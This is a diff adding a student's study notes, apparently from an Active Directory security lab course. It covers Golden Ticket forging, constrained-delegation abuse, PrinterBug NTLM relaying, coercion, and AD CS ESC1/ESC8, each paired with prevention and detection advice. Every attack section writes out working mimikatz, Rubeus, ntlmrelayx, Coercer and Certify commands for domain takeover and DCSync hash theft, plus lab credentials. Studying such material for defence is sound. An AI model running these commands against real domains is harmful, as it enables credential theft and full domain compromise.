@@ -357,7 +357,6 @@ TGT Service is generated 4768
 ## Detection
 - Domain Controller replication generates an event with the **ID 4662**
 
-
 ## Practical Challenges
     1. Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?
 
@@ -370,6 +369,336 @@ TGT Service is generated 4768
     **Solved:**
     - c'est tres interessant pour moi, car je sais exactement quell ID est utilise pour `replication` >> 4662
     - J'ai apres obtenu le drapeau
+
+
+# Golden Ticket
+-  threat agents can create/generate tickets for any user in the Domain >> Acting a DC
+    - `krbtgt is created by default`
+    - `krbtgt is a disabled account that cannot be deleted, renamed, or enabled`
+    - **Domain Controller's KDC service will use the password of krbtgt to derive a key with which it signs all Kerberos tickets**
+    -
+    - Problem >> **any user possessing the password's hash of krbtgt can create valid Kerberos TGTs.**
+
+## Attack
+- Avec Mimikatz
+    - /domain: The domain's name.
+    - /sid: The domain's SID value.
+    - /rc4: The password's hash of krbtgt.
+    - /user: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.
+    - /id: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.
+    - /renewmax: The maximum number of days the ticket can be renewed.
+    - /endin: End-of-life for the ticket.
+    -
+
+    1. Utilize DCSync with Rocky's account from the previous attack to **obtain the hash**:
+        `lsadump::dcsync /domain:eagle.local /user:krbtgt`
+    2. Get-DomainSID function from PowerView to obtain the SID value of the Domain:
+
+    3. Main command:
+       `kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584
+       /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt`
+
+    4. Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):
+
+
+## Prevention
+- Utilizing Microsoft's script for changing the password of **krbtgt KrbtgtKeys.ps1** is highly recommended
+- Enforce **SIDHistory filtering** between the domains in forests to prevent the escalation from a child domain to a parent domain
+
+## Detection
+- If a mature organization uses `Privileged Access Workstations (PAWs)`,
+- they should be alert to any privileged users not authenticating from those machines,
+- proactively monitoring events with the `ID 4624 and 4625` (successful and failed logon).
+
+
+- If SID filtering is enabled, we will get alerts with the event `ID 4675` during `cross-domain escalation.`
+
+# Kerberos Constrained Delegation
+- Three types of delegations in Active Directory:
+    - Unconstrained Delegation (most permissive/broad)
+    - Constrained Delegation >> `a user account will have its properties configured to specify which service(s) they can delegate`
+    - Resource-based Delegation >> `the configuration is within the computer object to whom delegation occurs`
+        - `the computer is configured as I trust only this/these accounts.`
+
+## Attack
+- Abuse of constrained delegation
+    - when an account is trusted for delegation, the account sends a request to the KDC
+    - saying that >> **Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ**
+    -  Kerberos ticket is generated for **user YYYY (without supplying the password of user YYYY)**
+
+    -  It is also possible to delegate to another service, even if not configured in the user properties
+    -  For example, if we are trusted to delegate for LDAP, we can perform protocol transition and be entrusted to any other service such as CIFS or HTTP.
+    -
+
+    1. We will use the `Get-NetUser` function from `PowerView` to **enumerate user accounts that are trusted for constrained delegation** in the domain:
+       `Get-NetUser -TrustedToAuth`
+
+    2. `web_service` >> configured for delegating the `HTTP service` to the Domain Controller DC1
+       HTTP service provides the ability to execute `PowerShell Remoting`
+
+    **Key moment:**
+    >> any threat actor gaining control over web_service can request a Kerberos ticket for any user in Active Directory and use it to connect to DC1 over PowerShell Remoting.
+
+    3. Get the hash: `.\Rubeus.exe hash /password:Slavi123`
+
+    4. use Rubeus to get a ticket for the Administrator account:
+    `.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local
+      /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt`
+
+      Now, administrator ticket is injected in the current session
+
+    5. connect to the Domain Controller impersonating the account Administrator: >> `Enter-PSSession dc1`
+
+## Prevention
+- Configure the property Account is sensitive and cannot be delegated for all privileged users.
+- Add privileged users to the Protected Users group: this membership automatically applies the protection mentioned above
+
+## Detection
+- S4U >> Service For User >> Microsoft extension to the Kerberos protocol that allows an application
+    service to obtain a Kerberos service ticket on behalf of a user.
+
+- a successful logon attempt with a delegated ticket will contain information about the ticket's issuer under the **Transited Services attribute** in the events log.
+- This attribute is normally populated if the logon resulted from `an S4U (Service For User)` logon process.
+
+## Practical Challenges
+    1. Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.
+
+    **Solved:**
+    - Apres, finishing all the steps, I initiated the Powershell Remoting and access to DC1
+    - Enfin, j'ai obtenu le drapeau
+
+# Print Spooler & NTLM Relaying
+- Print Spooler >> old service enabled by default
+    - force a remote machine to perform a connection to any other machine it can reach
+    - the reverse connection will carry `authentication information as a TGT`
+    -  **any domain user can coerce `RemoteServer$` to authenticate to any machine**
+    -  it will not be fixed, as the issue is "by-design".
+
+## Attack
+- Some Scenarios:
+    The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:
+    -
+    1. Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
+
+    2. Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD        server, which can be captured/exported with tools like Rubeus and Mimikatz.
+
+    3. Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the cer       tificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+
+    4. Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as a        ny Administrator to that machine
+
+    What we do >> ** will relay the connection to another DC and perform DCSync**
+
+    1. we will configure `NTLMRelayx` to forward any connections to DC2 and attempt to perform the DCSync attack:
+    `impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`
+    - This command is listening on smb connection to get ntlm authentication credentials >> then it
+        does dcsync attact to the machine with given IP-address
+    2. we need to `trigger the PrinterBug using the Kali box` with NTLMRelayx listening.
+    With **Dementor** tool
+    - `python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123`
+    - when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously       compromised Bob)
+
+    3. After triggering, NTLMRelayx will capture credentials >> does DCSync >> We will get the hash of krbtgtb
+
+
+
+## Prevention
+- `Print Spooler` >> should be disabled on all servers that are not printing servers.
+- Disable >>  **registry key RegisterSpoolerRemoteRpcEndPoint**
+    -  any incoming remote requests get blocked; this acts as if the service was disabled for remote clients.
+
+## Detection
+- In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated
+-
+
+## Honeypot
+-  use the PrinterBug as means of alerting on suspicious behavior in the environment.
+-  we would block outbound connections from our servers to ports 139 and 445 >> software or physical firewalls can achieve this
+-  Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent
+-  However, those blocked connections will act as signs of compromise for the blue team
+
+
+# Coercing Attacks & Unconstrained Delegation
+- any domain user can coerce RemoteServer$ to authenticate to any machine in the domain
+    - the `Coercer tool` was developed to exploit all known vulnerable `RPC functions simultaneously.`
+
+## Attack
+- Key Idea: >> **Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) -
+               this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.**
+
+    1. To identify systems configured for Unconstrained Delegation, we can use the Get-NetComputer function from PowerView
+        along with the -Unconstrained switch:
+        >> `Get-NetComputer -Unconstrained | select samaccountname`
+        **WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers are trusted by default)**
+
+    2. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:
+    `.\Rubeus.exe monitor /interval:1` >> to listen
+
+    3. In Kali, Execute `Coercer` towards DC1, while we force it to connect to WS001
+    - `Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local`
+    - we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:
+    - We can use this TGT for authentication within the domain, becoming the Domain Controller
+
+    How we use the obtained ticket >> `.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...`
+
+    4. a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
+    - `.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"`
+
+## Prevention
+- Block Domain Controllers and other core infrastructure servers from connecting `to outbound ports 139 and 445`,
+    - except to machines that are required for AD (as well for business operations)
+
+## Detection
+-  The **RPC Firewall** from `zero networks` is an excellent method of detecting the abuse of these functions
+
+# Object ACLs
+- Access Control Lists (ACLs) are tables, or simple lists, that define the trustees who have access to a specific object and their access type
+
+- Each access control list has a set of access control entries (ACE),
+
+## Attack
+- To identify `potential abusable ACLs`, we will use **BloodHound** to `graph the relationships between the objects`
+-  `SharpHound` to scan the environment and `pass` All to the `-c` parameter (short version of `CollectionMethod`):
+
+    1. `.\SharpHound.exe -c All`
+    - The ZIP file generated by SharpHound can then be visualized in BloodHound
+
+    2. Also: we can use **ADACLScanner to create reports of discretionary access control lists (DACLs) and system access control lists (SACLs).**
+
+## Prevention
+- Educate Employees >> Continuous Assessment >> Automate
+
+## Detection
+- ID 4738, "A user account was changed", is generated.
+
+## Honeypot
+- Assign relatively high ACLs to a user account used as a honeypot via a previously discussed technique—for example, a user whose fake credentials are exposed in the description field.
+
+# PKI - ESC1
+- Context:
+    - **Active Directory Certificate Services (AD CS)** >> After SpectreOps released the research paper Certified Pre-Owned
+    1. `Using certificates for authentication has more advantages than regular username/password credentials.`
+    2. `Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks
+        discovered by SpectreOps (various researchers have discovered more attacks since then).`
+
+- Advantages:
+    - advantages to using certificates and compromising the **Certificate Authority (CA)**:
+
+    1. Users and machines certificates are valid for 1+ years.
+    2. Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password;         the certificate will still be valid (unless expired or revoked).
+
+    3. Misconfigured templates allow for obtaining a certificate for any user.
+    4. Compromising the CA's private key results in forging Golden Certificates.
+
+    **ESC1:**
+    - The description of ESC1 is:
+    - *Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates +
+       CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT.*
+
+## Attack
+    1. To begin with, we will use `Certify` to scan the environment for vulnerabilities in the PKI infrastructure:
+    - `.\Certify.exe find /vulnerable`
+    - When checking the 'Vulnerable Certificate Templates' section, the given template **UserCert**
+        is vulnerable since:
+        1. All Domain users can request a certificate on this template.
+        2. The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the `SAN`
+            **(therefore, any user can request a certificate as any other user in the network, including privileged ones).**
+        3. Manager approval is not required (the certificate gets issued immediately after the request without approval).
+        4. The certificate can be used for 'Client Authentication' (we can use it for login/authentication).
+
+    2. Abusing this template:
+    - `.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`
+    - Use `Certify` and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user,
+    - for example, Administrator:
+
+    3. Once the attack finishes, we will obtain a certificate successfully.
+    4. We need to convert the PEM certificate to the PFX format b
+    - ` sed -i 's/\s\s\+/\n/g' cert.pem`
+    -  `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
+
+    5. Now that we have **the certificate** in a usable PFX format (which Rubeus supports),
+       we can request a **Kerberos TGT** for the **account Administrator and authenticate with the certificate:**
+
+       - `.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`
+       - Voila, the ticket is injected in the current session and working bien
+       -
+## Prevention
+    - The attack would not be possible if the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is `not enabled` in the certificate template
+    - Another protection >> **require CA certificate manager approval**
+
+## Detection
+    - When the CA generates the certificate, >> **IDs of 4886 and 4887**
+
+    - If we want to find the `SAN information`, we'll need to `open the certificate itself`:
+
+## Practical Challenges
+    1. After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB_@cademy_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?
+
+    **Solved:**
+    - `runas /user:eagle\htb-student powershell`
+    - `New-PSSession PKI`
+    - `Enter-PSSession PKI`
+    - `Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}`
+    - `Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}`
+    >> through this I got the flag
+    -
+    - **To view the full audit log of the events, we can pipe the output into Format-List**
+    - `$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}`
+    - `$events[0] | Format-List -Property *`
+
+# PKI - ESC8
+- Context:
+    - we will utilize the PrinterBug, and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.
+
+## Attack
+    1. NTLMRelayx to forward incoming connections to the HTTP endpoint of our Certificate Authority
+    -  we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD,
+    -  which Domain Controllers use for client authentication)
+    -  the `--adcs` switch makes NTLMRelayx parse and displays the certificate if one is received:
+
+    - `impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`
+
+    2. we need to get the Domain Controller to connect to us
+        - We’ll use the Print Spooler bug and force a reverse connection to us
+        - In this case, we are forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal:
+        - `python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123`
+        -
+        - **we will see that an incoming request from DC2$ was relayed and a certificate was successfully obtained:**
+        - This certificate is for **DC$2**
+
+    3. use Rubeus to the certificate to authenticate with and obtain a TGT:
+        - `.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>`
+        - TGT for DC2 is obtained with certificate
+
+    4. **We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2.
+       Being a Domain Controller, we can now trigger DCSync with Mimikatz:**
+        - `.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit`
+
+    - **This is successful impersonation of DC2 and performing DCSync to obtain Administrator's password hash**
+
+## Prevention
+- The attack was possible because:
+    1. We managed to coerce DC2 successfully
+    2. ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail, and we won't request a certificate)
+
+    **Highly advised to regularly scan the environment with Certify or other similar tools to find potential issues.**
+
+
+## Detection
+- Point
+    - **a certificate is requested by NTLMRelayx, we will see that the CA has flagged both the
+        request and the issuer of the certificate in events ID 4886 and 4887, respectively:**
+
+## Practical Challenges
+    1. Replicate the attack described in this section and view the related 4886 and 4887 logs.
+       Enter the name shown in the Requester field as your answer. (Format: EAGLE\....)
+
+
+    **Solved:**
+    - I have used Event Viewer  for the filter IDs >> 4886 & 4887
+    - J'ai trouve l'information necessaire pour le drapeau
+    - Voila, c'est fini
+
+
 
 
 
